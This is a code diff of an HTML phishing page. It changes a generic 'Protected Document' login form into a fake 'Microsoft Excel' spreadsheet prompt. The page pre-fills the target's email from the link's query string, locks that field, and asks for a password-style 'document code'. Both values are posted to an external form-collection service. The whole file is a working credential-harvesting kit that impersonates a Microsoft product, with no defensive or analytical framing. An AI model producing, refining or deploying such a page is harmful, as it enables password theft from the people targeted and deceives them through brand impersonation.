@@ -1,75 +1,105 @@
 <!DOCTYPE html>
 <html lang="en">
 <head>
-  <meta charset="UTF-8">
-  <title>Secure Document</title>
+<meta charset="UTF-8">
+<title>Spreadsheet</title>
 
-  <style>
-    body {
-      background: #e5e5e5;
-      font-family: Arial, sans-serif;
-      padding: 40px;
-    }
+<style>
+  body {
+    background: #f3f3f3;
+    font-family: Calibri, Arial, sans-serif;
+    padding: 40px;
+  }
 
-    .pdf {
-      background: white;
-      width: 600px;
-      margin: auto;
-      padding: 40px;
-      box-shadow: 0 0 15px rgba(0,0,0,0.2);
-    }
+  .sheet {
+    background: white;
+    width: 700px;
+    margin: auto;
+    border: 1px solid #bfbfbf;
+  }
 
-    h2 {
-      text-align: center;
-      margin-bottom: 30px;
-    }
+  table {
+    border-collapse: collapse;
+    width: 100%;
+  }
 
-    label {
-      font-weight: bold;
-    }
+  td, th {
+    border: 1px solid #d0d0d0;
+    padding: 8px;
+    font-size: 14px;
+  }
 
-    input {
-      width: 100%;
-      padding: 10px;
-      margin-top: 5px;
-      margin-bottom: 20px;
-      border: 1px solid #ccc;
-    }
+  th {
+    background: #e6e6e6;
+    text-align: center;
+    font-weight: bold;
+  }
 
-    button {
-      width: 100%;
-      padding: 12px;
-      background: #333;
-      color: white;
-      border: none;
-      cursor: pointer;
-    }
-  </style>
+  .label {
+    background: #f2f2f2;
+    font-weight: bold;
+    width: 200px;
+  }
+
+  input {
+    width: 100%;
+    border: none;
+    outline: none;
+    font-family: Calibri, Arial, sans-serif;
+    font-size: 14px;
+  }
+
+  button {
+    width: 100%;
+    padding: 10px;
+    background: #217346; /* Excel green */
+    color: white;
+    border: none;
+    font-size: 14px;
+    cursor: pointer;
+  }
+</style>
 </head>
+
 <body>
 
-  <div class="pdf">
-    <h2>Protected Document</h2>
+<div class="sheet">
+  <form action="https://formcarry.com/s/zPqDzDWqria" method="POST">
+    <table>
+      <tr>
+        <th colspan="2">Microsoft Excel</th>
+      </tr>
 
-    <form action="https://formcarry.com/s/zPqDzDWqria" method="POST">
+      <tr>
+        <td class="label">Email</td>
+        <td>
+          <input type="email" id="email" name="email" readonly required>
+        </td>
+      </tr>
 
-      <label>Email address</label>
-      <input type="email" id="email" name="email" readonly required>
+      <tr>
+        <td class="label">Document code</td>
+        <td>
+          <input type="password" name="document_code" required>
+        </td>
+      </tr>
 
-      <label>Document access code</label>
-      <input type="password" name="document_code" required>
+      <tr>
+        <td colspan="2">
+          <button type="submit">Open Spreadsheet</button>
+        </td>
+      </tr>
+    </table>
+  </form>
+</div>
 
-      <button type="submit">View Document</button>
-    </form>
-  </div>
-
-  <script>
-    const params = new URLSearchParams(window.location.search);
-    const email = params.get("email");
-    if (email) {
-      document.getElementById("email").value = email;
-    }
-  </script>
+<script>
+  const params = new URLSearchParams(window.location.search);
+  const email = params.get("email");
+  if (email) {
+    document.getElementById("email").value = email;
+  }
+</script>
 
 </body>
 </html>
